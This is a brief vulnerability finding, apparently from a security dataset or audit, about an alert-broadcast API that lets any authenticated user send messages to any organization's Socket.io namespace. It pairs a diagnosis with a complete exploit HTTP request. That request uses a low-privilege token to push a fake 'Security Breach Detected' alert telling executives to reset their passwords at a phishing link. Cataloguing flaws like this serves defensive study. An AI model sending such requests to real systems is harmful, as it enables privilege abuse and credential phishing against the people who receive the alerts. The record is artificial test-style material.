diagnosis: The emergency alert broadcast endpoint accepts targetNamespace in the request body and emits messages via the Socket.io Redis adapter without validating that the authenticated user belongs to or administers that namespace. An attacker can broadcast spoofed security warnings or emergency instructions to any corporate namespace on the cluster.
exploit_request:
POST /api/notifications/namespace-broadcast HTTP/1.1
Host: alerts.ops.internal:4003
Authorization: Bearer <low_privilege_user_jwt>
Content-Type: application/json

{
  "targetNamespace": "/orgs/executive-hq",
  "alertTitle": "Security Breach Detected",
  "alertMessage": "Reset passwords immediately at http://attacker-phish.internal",
  "severity": "CRITICAL"
}
